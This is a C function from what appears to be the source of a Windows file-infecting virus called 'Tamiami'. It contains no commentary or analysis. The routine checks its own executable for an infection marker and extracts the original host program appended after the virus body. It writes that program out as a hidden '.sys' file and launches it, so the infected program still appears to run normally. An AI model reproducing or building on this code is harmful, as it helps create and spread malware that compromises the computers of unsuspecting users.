   bool StartHost(void)
   {
       char        InfectionMarker[] = "Tamiami";
       char        HostFile[MAX_PATH];
       HANDLE      HostHandle;
       DWORD       HostSize;
       char        MarkerBuffer[50];
       DWORD       BytesRead;
       DWORD       BytesWrite;
       HGLOBAL     HostMem;
       LPVOID      HostMemStart;

       if(GetModuleFileName(0, HostFile, sizeof(HostFile)) != 0)
       {
           HostHandle = CreateFile(HostFile, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

           if(HostHandle != INVALID_HANDLE_VALUE)
           {
               HostSize = GetFileSize(HostHandle, 0);

               if(HostSize != 0)
               {
                   if(SetFilePointer(HostHandle, HostSize - lstrlen(InfectionMarker), 0, FILE_BEGIN) != 0xFFFFFFFF)
                   {
                       if(ReadFile(HostHandle, MarkerBuffer, lstrlen(InfectionMarker), &BytesRead, 0) != 0)
                       {
                           if(lstrcmp(MarkerBuffer, InfectionMarker) == 0)
                           {
                               if(SetFilePointer(HostHandle, TamiamiSize, 0, FILE_BEGIN) != 0xFFFFFFFF)
                               {
                                   HostMem = GlobalAlloc(GMEM_MOVEABLE, HostSize - TamiamiSize - lstrlen(InfectionMarker));
                                   HostMemStart = GlobalLock(HostMem);

                                   if(HostMem != 0 && HostMemStart != 0)
                                   {
                                       if(ReadFile(HostHandle, HostMemStart, HostSize - TamiamiSize - lstrlen(InfectionMarker), &BytesRead, 0) != 0)
                                       {
                                           CloseHandle(HostHandle);

                                           lstrcpy(HostFile + lstrlen(HostFile) - 3, "sys");

                                           HostHandle = CreateFile(HostFile, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0);

                                           if(HostHandle != INVALID_HANDLE_VALUE)
                                           {
                                               if(WriteFile(HostHandle, HostMemStart, HostSize - TamiamiSize - lstrlen(InfectionMarker), &BytesWrite, 0) != 0)
                                               {
                                                   CloseHandle(HostHandle);
                                                   GlobalUnlock(HostMem);
                                                   GlobalFree(HostMem);

                                                   if(WinExec(HostFile, SW_SHOW) > 31) return true;
                                               }

                                               CloseHandle(HostHandle);
                                           }
                                       }

                                       GlobalUnlock(HostMem);
                                       GlobalFree(HostMem);
                                   }
                               }
                           }
                       }
                   }
               }

               CloseHandle(HostHandle);
           }
       }

       return false;
   }
